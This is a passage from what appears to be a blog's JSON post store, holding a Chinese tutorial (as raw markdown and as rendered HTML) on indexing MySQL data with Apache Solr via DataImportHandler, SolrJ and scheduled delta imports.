updateTime> '${dataimporter.last_index_time}' and isDeleted=0\"\ndeletedPkQuery=\"select id from user where isDeleted=1\"\n```\n这时候Solr进行增量索引的时候，就会删除数据库中isDeleted=1的数据的索引。\n\n### 测试增量导入\n\n如果User表里有数据，可以先清空以前的测试数据（因为加的updateTime没有值），用我的Mybatis测试程序添加一个User，数据库会以当前时间赋值给该字段。在Solr中使用Query查询所有没有查询到该值，使用dataimport?command=delta-import增量导入，再次查询所有就可以查询到刚刚插入到MySQL的值。\n\n### 设置增量导入为定时执行的任务\n\n可以用Windows计划任务，或者Linux的Cron来定期访问增量导入的连接来完成定时增量导入的功能，这其实也是可以的，而且应该没什么问题。\n\n但是更方便，更加与Solr本身集成度高的是利用其自身的定时增量导入功能。\n\n1、下载apache-solr-dataimportscheduler-1.0.jar放到\\solr-webapp\\webapp\\WEB-INF\\lib目录下：\n下载地址：http://code.google.com/p/solr-dataimport-scheduler/downloads/list\n也可以到百度云盘下载：http://pan.baidu.com/s/1dDw0MRn\n\n注意：apache-solr-dataimportscheduler-1.0.jar有bug，参考：http://www.denghuafeng.com/post-242.html\n\n2、修改solr的WEB-INF目录下面的web.xml文件：\n为<web-app>元素添加一个子元素\n```bash\n<listener>\n        <listener-class>\n    org.apache.solr.handler.dataimport.scheduler.ApplicationListener\n        </listener-class>\n    </listener>\n```\n\n3、新建配置文件dataimport.properties：\n\n在SOLR_HOME\\solr目录下面新建一个目录conf（注意不是SOLR_HOME\\solr\\collection1下面的conf），然后用解压文件打开apache-solr-dataimportscheduler-1.0.jar文件，将里面的dataimport.properties文件拷贝过来，进行修改，下面是最终我的自动定时更新配置文件内容：\n\n```bash\n#################################################\n#                                               #\n#       dataimport scheduler properties         #\n#                                               #\n#################################################\n\n#  to sync or not to sync\n#  1 - active; anything else - inactive\nsyncEnabled=1\n\n#  which cores to schedule\n#  in a multi-core environment you can decide which cores you want syncronized\n#  leave empty or comment it out if using single-core deployment\n#  syncCores=game,resource\nsyncCores=collection1\n\n#  solr server name or IP address\n#  [defaults to localhost if empty]\nserver=localhost\n\n#  solr server port\n#  [defaults to 80 if empty]\nport=8983\n\n#  application name/context\n#  [defaults to current ServletContextListener's context (app) name]\nwebapp=solr\n\n#  URLparams [mandatory]\n#  remainder of URL\n#http://localhost:8983/solr/collection1/dataimport?command=delta-import&clean=false&commit=true\nparams=/dataimport?command=delta-import&clean=false&commit=true\n\n#  schedule interval\n#  number of minutes between two runs\n#  [defaults to 30 if empty]\ninterval=1\n\n#  重做索引的时间间隔，单位分钟，默认7200，即1天; \n#  为空,为0,或者注释掉:表示永不重做索引\n# reBuildIndexInterval=2\n\n#  重做索引的参数\nreBuildIndexParams=/dataimport?command=full-import&clean=true&commit=true\n\n#  重做索引时间间隔的计时开始时间，第一次真正执行的时间=reBuildIndexBeginTime+reBuildIndexInterval*60*1000；\n#  两种格式：2012-04-11 03:10:00 或者  03:10:00，后一种会自动补全日期部分为服务启动时的日期\nreBuildIndexBeginTime=03:10:00\n```\n这里为了做测试每1分钟就进行一次增量索引，同时disable了full-import全量索引。\n\n4、测试\n\n在数据库中插入一条数据，在Solr Query中查询，刚开始查不到，Solr进行一次增量索引后就可以查询到了。\n\n一般来说要在你的项目中引入Solr需要考虑以下几点：\n1、数据更新频率：每天数据增量有多大，及时更新还是定时更新\n2、数据总量：数据要保存多长时间\n3、一致性要求：期望多长时间内看到更新的数据，最长允许多长时间延迟\n4、数据特点：数据源包括哪些，平均单条记录大小\n5、业务特点：有哪些排序要求，检索条件\n6、资源复用：已有的硬件配置是怎样的，是否有升级计划","source":"_posts/使用Solr索引MySQL数据.md","raw":"---\ntitle: 使用Solr索引MySQL数据\ncategories:\n  - 其他技术\ntags:\n  - solr\n  - mysql\ndate: 2016-7-3 21:18:00\ntoc: false\n---\n\n\n### 环境搭建\n1、到apache下载solr，地址：http://mirrors.hust.edu.cn/apache/lucene/solr/\n2、解压到某个目录\n3、cd into D:\\Solr\\solr-4.10.3\\example\n4、Execute the server by “java -jar startup.jar”Solr会自动运行在自带的Jetty上\n5、访问http://localhost:8983/solr/#/\n\nPS：solr-5.0 以上默认对schema的管理是使用managed-schema，不能手动修改，需要使用Schema Restful的API操作。如果要想手动修改配置，把managed-schema拷贝一份修改为schema.xml，在solrconfig.xml中修改如下：\n\n```bash\n<!-- <schemaFactory class=\"ManagedIndexSchemaFactory\">\n    <bool name=\"mutable\">true</bool>\n    <str name=\"managedSchemaResourceName\">managed-schema</str>\n  </schemaFactory> -->\n  \n<!-- <processor class=\"solr.AddSchemaFieldsUpdateProcessorFactory\">\n      <str name=\"defaultFieldType\">strings</str>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.lang.Boolean</str>\n        <str name=\"fieldType\">booleans</str>\n      </lst>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.util.Date</str>\n        <str name=\"fieldType\">tdates</str>\n      </lst>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.lang.Long</str>\n        <str name=\"valueClass\">java.lang.Integer</str>\n        <str name=\"fieldType\">tlongs</str>\n      </lst>\n      <lst name=\"typeMapping\">\n\n\n        <str name=\"valueClass\">java.lang.Number</str>\n        <str name=\"fieldType\">tdoubles</str>\n      </lst>\n    </processor> -->\n    \n  <schemaFactory class=\"ClassicIndexSchemaFactory\"/>\n```\n\n<!-- more -->\n\n### 创建MySQL数据\n\nDataBase Name: mybatis\nTable Name: user\nDb.sql\n\n```bash\nSET FOREIGN_KEY_CHECKS=0;\n-- ----------------------------\n-- Table structure for `user`\n-- ----------------------------\nDROP TABLE IF EXISTS `user`;\n\nCREATE TABLE `user` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `userName` varchar(50) DEFAULT NULL,\n  `userAge` int(11) DEFAULT NULL,\n  `userAddress` varchar(200) DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;\n\n-- ----------------------------\n-- Records of user\n-- ----------------------------\nINSERT INTO `user` VALUES ('1', 'summer', '30', 'shanghai');\nINSERT INTO `user` VALUES ('2', 'test1', '22', 'suzhou');\nINSERT INTO `user` VALUES ('3', 'test1', '29', 'some place');\nINSERT INTO `user` VALUES ('4', 'lu', '28', 'some place');\nINSERT INTO `user` VALUES ('5', 'xiaoxun', '27', 'nanjing');\n```\n\n### 使用DataImportHandler导入并索引数据\n\n1） 配置D:\\Solr\\solr-4.10.3\\example\\solr\\collection1\\conf\\solrconfig.xml\n\n在<requestHandler name=\"/select\" class=\"solr.SearchHandler\">前面上加上一个dataimport的处理的Handler\n```bash\n<requestHandler name=\"/dataimport\" class=\"org.apache.solr.handler.dataimport.DataImportHandler\">\n　　     <lst name=\"defaults\">\n　　        <str name=\"config\">data-config.xml</str>\n　　     </lst>\n　　</requestHandler>\n```\n2） 在同目录下添加data-config.xml\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<dataConfig>\n    <dataSource type=\"JdbcDataSource\" driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://127.0.0.1:3306/mybatis\" user=\"root\" password=\"luxx\" batchSize=\"-1\" />\n　　<document name=\"testDoc\">\n        <entity name=\"user\" pk=\"id\"\n                query=\"select * from user\">\n　　　         <field column=\"id\" name=\"id\"/>\n　　　        <field column=\"userName\" name=\"userName\"/>\n            <field column=\"userAge\" name=\"userAge\"/>\n            <field column=\"userAddress\" name=\"userAddress\"/>\n　　　  </entity>\n　　</document>\n</dataConfig>\n```\n\n说明：\ndataSource是数据库数据源。\nEntity就是一张表对应的实体，pk是主键，query是查询语句。\nField对应一个字段，column是数据库里的column名，后面的name属性对应着Solr的Filed的名字。\n\n3） 修改同目录下的schema.xml，这是Solr对数据库里的数据进行索引的模式\n（1）保留_version_ 这个field\n（2）添加索引字段：这里每个field的name要和data-config.xml里的entity的field的name一样，一一对应。\n\n```bash\n<field name=\"id\" type=\"int\" indexed=\"true\" stored=\"true\" required=\"true\" multiValued=\"false\" />\n\n<!--<field name=\"id\" type=\"int\" indexed=\"true\" stored=\"true\" required=\"true\" multiValued=\"false\"/> -->\n\n<field name=\"userName\" type=\"text_general\" indexed=\"true\" stored=\"true\" />\n\n<field name=\"userAge\" type=\"int\" indexed=\"true\" stored=\"true\" />\n\n<field name=\"userAddress\" type=\"text_general\" indexed=\"true\" stored=\"true\" />\n```\n\n（3）删除多余的field，删除copyField里的设置，这些用不上。注意：text这个field不能删除，否则Solr启动失败。\n```bash\n<field name=\"text\" type=\"text_general\" indexed=\"true\" stored=\"false\" multiValued=\"true\"/>\n```\n\n（4）设置唯一主键：<uniqueKey>id</uniqueKey>，注意：Solr中索引的主键默认是只支持type=\"string\"字符串类型的，而我的数据库中id是int型的，会有问题，解决方法：修改同目录下的elevate.xml，注释掉下面2行，这貌似是Solr的Bug，原因不明。\n```bash\n<doc id=\"MA147LL/A\" />\n<doc id=\"IW-02\" exclude=\"true\" />\n```\n\n4）拷贝mysql-connector-java-5.1.22-bin.jar和solr-dataimporthandler-4.10.3.jar到D:\\Solr\\solr-4.10.3\\example\\solr-webapp\\webapp\\WEB-INF\\lib。一个是mysql的java驱动，另一个在D:\\Solr\\solr-4.10.3\\dist目录里，是org.apache.solr.handler.dataimport.DataImportHandler所在的jar。\n\n重启Solr。如果配置正确就可以启动成功。\n\nsolrconfig.xml是solr的基础文件，里面配置了各种web请求处理器、请求响应处理器、日志、缓存等。\nschema.xml配置映射了各种数据类型的索引方案。分词器的配置、索引文档中包含的字段也在此配置。\n\n### 索引测试\n\n进入Solr主页，在Core Selector中选择collection1：http://localhost:8983/solr/#/collection1\n\n点击Dataimport，Command选择full-import（默认），点击“Execute”，Refresh Status就可以看到结果：\nIndexing completed. Added/Updated: 7 documents.Deleted 0 documents.\nRequests: 1, Fetched: 7, Skipped: 0, Processed: 7\nStarted: 8 minutes ago\n\nQuery测试：在q中输入userName:test1进行检索就可以看到结果。\n这里使用full-import索引了配置数据库中的全部数据，使用Solr可以查询对应的数据。\n\n### 使用Solrj索引并检索数据\n\n上面是使用Solr Admin页面上的功能测试索引和检索，也可以使用代码来操作Solr，下面的代码测试了在Solr索引中添加了一个User类实体，并通过查找所有的index来返回结果。\n\nUser实体类：\n\n```bash\npackage com.mybatis.test.model;\n\nimport org.apache.solr.client.solrj.beans.Field;\n\npublic class User {\n\n    @Field\n    private int id;\n    \n    @Field\n    private String userName;\n    \n    @Field\n    private int userAge;\n    \n    @Field\n    private String userAddress;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getUserName() {\n        return userName;\n    }\n\n    public void setUserName(String userName) {\n        this.userName = userName;\n    }\n\n    public int getUserAge() {\n        return userAge;\n    }\n\n    public void setUserAge(int userAge) {\n        this.userAge = userAge;\n    }\n\n    public String getUserAddress() {\n        return userAddress;\n    }\n\n    public void setUserAddress(String userAddress) {\n        this.userAddress = userAddress;\n    }\n\n    @Override\n    public String toString() {\n        return this.userName + \" \" + this.userAge + \" \" + this.userAddress;\n    }\n\n}\n```\n\n使用@Field注解的属性要和Solr配置的Field对应。\n\n测试代码：\n\n```bash\npackage com.solr.test;\n\nimport java.io.IOException;\n\nimport org.apache.solr.client.solrj.SolrQuery;\nimport org.apache.solr.client.solrj.SolrServer;\nimport org.apache.solr.client.solrj.SolrServerException;\nimport org.apache.solr.client.solrj.impl.HttpSolrServer;\nimport org.apache.solr.client.solrj.response.QueryResponse;\nimport org.apache.solr.client.solrj.response.UpdateResponse;\nimport org.apache.solr.common.SolrDocumentList;\n\nimport com.mybatis.test.model.User;\n\npublic class SolrTest {\n    \n    private static SolrServer server;\n    \n    private static final String DEFAULT_URL = \"http://localhost:8983/solr/collection1\";\n    \n    public static void init() {\n        server = new HttpSolrServer(DEFAULT_URL);\n    }\n    \n    public static void indexUser(User user){\n        try {\n            //添加user bean到索引库\n            try {\n                UpdateResponse response = server.addBean(user);\n                server.commit();\n                System.out.println(response.getStatus());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } catch (SolrServerException e) {\n            e.printStackTrace();\n        } \n    }\n    \n    //测试添加一个新的bean实例到索引\n    public static void testIndexUser(){\n        User user = new User();\n        user.setId(8);\n        user.setUserAddress(\"place\");\n        user.setUserName(\"cdebcdccga\");\n        user.setUserAge(83);\n        \n        indexUser(user);\n    }\n    \n    public static void testQueryAll() {\n        SolrQuery params = new SolrQuery();\n        \n        // 查询关键词，*:*代表所有属性、所有值，即所有index\n        params.set(\"q\", \"*:*\");\n        \n        // 分页，start=0就是从0开始，rows=5当前返回5条记录，第二页就是变化start这个值为5就可以了。\n        params.set(\"start\", 0);\n        params.set(\"rows\", Integer.MAX_VALUE);\n            \n        // 排序，如果按照id排序，那么将score desc 改成 id desc(or asc)\n        // params.set(\"sort\", \"score desc\");\n        params.set(\"sort\", \"id asc\");\n        \n        // 返回信息*为全部，这里是全部加上score，如果不加下面就不能使用score\n        params.set(\"fl\", \"*,score\");\n        \n        QueryResponse response = null;\n        try {\n            response = server.query(params);\n        } catch (SolrServerException e) {\n            e.printStackTrace();\n        }\n        \n        if(response!=null){\n            System.out.println(\"Search Results: \");\n            SolrDocumentList list = response.getResults();\n            for (int i = 0; i < list.size(); i++) {\n                System.out.println(list.get(i));\n            }\n        }\n    }\n     \n    public static void main(String[] args) {\n        init();\n        //testIndexUser();\n        testQueryAll();\n    }\n}\n```\n\n如果在数据库中添加一条数据，但是Solr索引中没有index这条数据，就查不到，所以一般在使用Solr检索数据库里的内容时，都是先插入数据库，再在Solr中index这条数据，使用Solr的模糊查询或是分词功能来检索数据库里的内容。\n\n### DIH增量从MYSQL数据库导入数据\n已经学会了如何全量导入MySQL的数据，全量导入在数据量大的时候代价非常大，一般来说都会适用增量的方式来导入数据，下面介绍如何增量导入MYSQL数据库中的数据，以及如何设置定时来做。\n\n1）数据库表的更改\n\n前面已经创建好了一个User的表，这里为了能够进行增量导入，需要新增一个字段updateTime，类型为timestamp，默认值为CURRENT_TIMESTAMP。\n\n有了这样一个字段，Solr才能判断增量导入的时候，哪些数据是新的。\n\n因为Solr本身有一个默认值last_index_time，记录最后一次做full import或者是delta import(增量导入）的时间，这个值存储在文件conf目录的dataimport.properties文件中。\n\n2）data-config.xml中必要属性的设置\n\ntransformer 格式转化：HTMLStripTransformer 索引中忽略HTML标签\nquery：查询数据库表符合记录数据\ndeltaQuery：增量索引查询主键ID  注意这个只能返回ID字段   \ndeltaImportQuery：增量索引查询导入的数据 \ndeletedPkQuery：增量索引删除主键ID查询 注意这个只能返回ID字段   \n\n有关“query”，“deltaImportQuery”， “deltaQuery”的解释，引用官网说明，如下所示：\nThe query gives the data needed to populate fields of the Solr document in full-import\nThe deltaImportQuery gives the data needed to populate fields when running a delta-import\nThe deltaQuery gives the primary keys of the current entity which have changes since the last index time\n\n如果需要关联子表查询，可能需要用到parentDeltaQuery\nThe parentDeltaQuery uses the changed rows of the current table (fetched with deltaQuery) to give the changed rows in theparent table. This is necessary because whenever a row in the child table changes, we need to re-generate the document which has that field.\n\n更多说明看DeltaImportHandler的说明文档。\n\n针对User表，data-config.xml文件的配置内容如下：\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<dataConfig>\n    <dataSource type=\"JdbcDataSource\" driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://127.0.0.1:3306/mybatis\" user=\"root\" password=\"luxx\" batchSize=\"-1\" />\n　　<document name=\"testDoc\">\n        <entity name=\"user\" pk=\"id\"\n                query=\"select * from user\"\n                deltaImportQuery=\"select * from user where id='${dih.delta.id}'\"\n                deltaQuery=\"select id from user where updateTime> '${dataimporter.last_index_time}'\">\n　　　         <field column=\"id\" name=\"id\"/>\n　　　        <field column=\"userName\" name=\"userName\"/>\n            <field column=\"userAge\" name=\"userAge\"/>\n            <field column=\"userAddress\" name=\"userAddress\"/>\n<field column=\"updateTime\" name=\"updateTime\"/>\n　　　  </entity>\n　　</document>\n</dataConfig>\n```\n\n增量索引的原理是从数据库中根据deltaQuery指定的SQL语句查询出所有需要增量导入的数据的ID号。\n\n然后根据deltaImportQuery指定的SQL语句返回所有这些ID的数据，即为这次增量导入所要处理的数据。\n\n核心思想是：通过内置变量“${dih.delta.id}”和 “${dataimporter.last_index_time}”来记录本次要索引的id和最近一次索引的时间。\n\n注意：刚新加上的updateTime字段也要在field属性中配置，同时也要在schema.xml文件中配置：\n```bash\n<field name=\"updateTime\" type=\"date\" indexed=\"true\" stored=\"true\" />\n```\n\n如果业务中还有删除操作，可以在数据库中加一个isDeleted字段来表明该条数据是否已经被删除，这时候Solr在更新index的时候，可以根据这个字段来更新哪些已经删除了的记录的索引。\n\n这时候需要在dataConfig.xml中添加：\n```bash\nquery=\"select * from user where isDeleted=0\"\ndeltaImportQuery=\"select * from user where id='${dih.delta.id}'\"\ndeltaQuery=\"select id from user where updateTime> '${dataimporter.last_index_time}' and isDeleted=0\"\ndeletedPkQuery=\"select id from user where isDeleted=1\"\n```\n这时候Solr进行增量索引的时候，就会删除数据库中isDeleted=1的数据的索引。\n\n### 测试增量导入\n\n如果User表里有数据，可以先清空以前的测试数据（因为加的updateTime没有值），用我的Mybatis测试程序添加一个User，数据库会以当前时间赋值给该字段。在Solr中使用Query查询所有没有查询到该值，使用dataimport?command=delta-import增量导入，再次查询所有就可以查询到刚刚插入到MySQL的值。\n\n### 设置增量导入为定时执行的任务\n\n可以用Windows计划任务，或者Linux的Cron来定期访问增量导入的连接来完成定时增量导入的功能，这其实也是可以的，而且应该没什么问题。\n\n但是更方便，更加与Solr本身集成度高的是利用其自身的定时增量导入功能。\n\n1、下载apache-solr-dataimportscheduler-1.0.jar放到\\solr-webapp\\webapp\\WEB-INF\\lib目录下：\n下载地址：http://code.google.com/p/solr-dataimport-scheduler/downloads/list\n也可以到百度云盘下载：http://pan.baidu.com/s/1dDw0MRn\n\n注意：apache-solr-dataimportscheduler-1.0.jar有bug，参考：http://www.denghuafeng.com/post-242.html\n\n2、修改solr的WEB-INF目录下面的web.xml文件：\n为<web-app>元素添加一个子元素\n```bash\n<listener>\n        <listener-class>\n    org.apache.solr.handler.dataimport.scheduler.ApplicationListener\n        </listener-class>\n    </listener>\n```\n\n3、新建配置文件dataimport.properties：\n\n在SOLR_HOME\\solr目录下面新建一个目录conf（注意不是SOLR_HOME\\solr\\collection1下面的conf），然后用解压文件打开apache-solr-dataimportscheduler-1.0.jar文件，将里面的dataimport.properties文件拷贝过来，进行修改，下面是最终我的自动定时更新配置文件内容：\n\n```bash\n#################################################\n#                                               #\n#       dataimport scheduler properties         #\n#                                               #\n#################################################\n\n#  to sync or not to sync\n#  1 - active; anything else - inactive\nsyncEnabled=1\n\n#  which cores to schedule\n#  in a multi-core environment you can decide which cores you want syncronized\n#  leave empty or comment it out if using single-core deployment\n#  syncCores=game,resource\nsyncCores=collection1\n\n#  solr server name or IP address\n#  [defaults to localhost if empty]\nserver=localhost\n\n#  solr server port\n#  [defaults to 80 if empty]\nport=8983\n\n#  application name/context\n#  [defaults to current ServletContextListener's context (app) name]\nwebapp=solr\n\n#  URLparams [mandatory]\n#  remainder of URL\n#http://localhost:8983/solr/collection1/dataimport?command=delta-import&clean=false&commit=true\nparams=/dataimport?command=delta-import&clean=false&commit=true\n\n#  schedule interval\n#  number of minutes between two runs\n#  [defaults to 30 if empty]\ninterval=1\n\n#  重做索引的时间间隔，单位分钟，默认7200，即1天; \n#  为空,为0,或者注释掉:表示永不重做索引\n# reBuildIndexInterval=2\n\n#  重做索引的参数\nreBuildIndexParams=/dataimport?command=full-import&clean=true&commit=true\n\n#  重做索引时间间隔的计时开始时间，第一次真正执行的时间=reBuildIndexBeginTime+reBuildIndexInterval*60*1000；\n#  两种格式：2012-04-11 03:10:00 或者  03:10:00，后一种会自动补全日期部分为服务启动时的日期\nreBuildIndexBeginTime=03:10:00\n```\n这里为了做测试每1分钟就进行一次增量索引，同时disable了full-import全量索引。\n\n4、测试\n\n在数据库中插入一条数据，在Solr Query中查询，刚开始查不到，Solr进行一次增量索引后就可以查询到了。\n\n一般来说要在你的项目中引入Solr需要考虑以下几点：\n1、数据更新频率：每天数据增量有多大，及时更新还是定时更新\n2、数据总量：数据要保存多长时间\n3、一致性要求：期望多长时间内看到更新的数据，最长允许多长时间延迟\n4、数据特点：数据源包括哪些，平均单条记录大小\n5、业务特点：有哪些排序要求，检索条件\n6、资源复用：已有的硬件配置是怎样的，是否有升级计划","slug":"使用Solr索引MySQL数据","published":1,"updated":"2016-11-17T11:59:42.679Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldp0041gwtmzhy1py2v","content":"<h3 id=\"&#x73AF;&#x5883;&#x642D;&#x5EFA;\"><a href=\"#&#x73AF;&#x5883;&#x642D;&#x5EFA;\" class=\"headerlink\" title=\"&#x73AF;&#x5883;&#x642D;&#x5EFA;\"></a>&#x73AF;&#x5883;&#x642D;&#x5EFA;</h3><p>1&#x3001;&#x5230;apache&#x4E0B;&#x8F7D;solr&#xFF0C;&#x5730;&#x5740;&#xFF1A;<a href=\"http://mirrors.hust.edu.cn/apache/lucene/solr/\" target=\"_blank\" rel=\"external\">http://mirrors.hust.edu.cn/apache/lucene/solr/</a><br>2&#x3001;&#x89E3;&#x538B;&#x5230;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;<br>3&#x3001;cd into D:\\Solr\\solr-4.10.3\\example<br>4&#x3001;Execute the server by &#x201C;java -jar startup.jar&#x201D;Solr&#x4F1A;&#x81EA;&#x52A8;&#x8FD0;&#x884C;&#x5728;&#x81EA;&#x5E26;&#x7684;Jetty&#x4E0A;<br>5&#x3001;&#x8BBF;&#x95EE;<a href=\"http://localhost:8983/solr/#/\" target=\"_blank\" rel=\"external\">http://localhost:8983/solr/#/</a></p>\n<p>PS&#xFF1A;solr-5.0 &#x4EE5;&#x4E0A;&#x9ED8;&#x8BA4;&#x5BF9;schema&#x7684;&#x7BA1;&#x7406;&#x662F;&#x4F7F;&#x7528;managed-schema&#xFF0C;&#x4E0D;&#x80FD;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;Schema Restful&#x7684;API&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x679C;&#x8981;&#x60F3;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x628A;managed-schema&#x62F7;&#x8D1D;&#x4E00;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;schema.xml&#xFF0C;&#x5728;solrconfig.xml&#x4E2D;&#x4FEE;&#x6539;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- &lt;schemaFactory class=<span class=\"string\">&quot;ManagedIndexSchemaFactory&quot;</span>&gt;</span><br><span class=\"line\">    &lt;bool name=<span class=\"string\">&quot;mutable&quot;</span>&gt;<span class=\"literal\">true</span>&lt;/bool&gt;</span><br><span class=\"line\">    &lt;str name=<span class=\"string\">&quot;managedSchemaResourceName&quot;</span>&gt;managed-schema&lt;/str&gt;</span><br><span class=\"line\">  &lt;/schemaFactory&gt; --&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;!-- &lt;processor class=<span class=\"string\">&quot;solr.AddSchemaFieldsUpdateProcessorFactory&quot;</span>&gt;</span><br><span class=\"line\">      &lt;str name=<span class=\"string\">&quot;defaultFieldType&quot;</span>&gt;strings&lt;/str&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Boolean&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;booleans&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.util.Date&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tdates&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Long&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Integer&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tlongs&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Number&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tdoubles&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">    &lt;/processor&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &lt;schemaFactory class=<span class=\"string\">&quot;ClassicIndexSchemaFactory&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\"><a href=\"#&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\"></a>&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;</h3><p>DataBase Name: mybatis<br>Table Name: user<br>Db.sql</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET FOREIGN_KEY_CHECKS=0;</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">-- Table structure <span class=\"keyword\">for</span> `user`</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">DROP TABLE IF EXISTS `user`;</span><br><span class=\"line\"></span><br><span class=\"line\">CREATE TABLE `user` (</span><br><span class=\"line\">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">  `userName` varchar(50) DEFAULT NULL,</span><br><span class=\"line\">  `userAge` int(11) DEFAULT NULL,</span><br><span class=\"line\">  `userAddress` varchar(200) DEFAULT NULL,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;</span><br><span class=\"line\"></span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">-- Records of user</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;1&apos;</span>, <span class=\"string\">&apos;summer&apos;</span>, <span class=\"string\">&apos;30&apos;</span>, <span class=\"string\">&apos;shanghai&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;2&apos;</span>, <span class=\"string\">&apos;test1&apos;</span>, <span class=\"string\">&apos;22&apos;</span>, <span class=\"string\">&apos;suzhou&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;3&apos;</span>, <span class=\"string\">&apos;test1&apos;</span>, <span class=\"string\">&apos;29&apos;</span>, <span class=\"string\">&apos;some place&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;4&apos;</span>, <span class=\"string\">&apos;lu&apos;</span>, <span class=\"string\">&apos;28&apos;</span>, <span class=\"string\">&apos;some place&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;5&apos;</span>, <span class=\"string\">&apos;xiaoxun&apos;</span>, <span class=\"string\">&apos;27&apos;</span>, <span 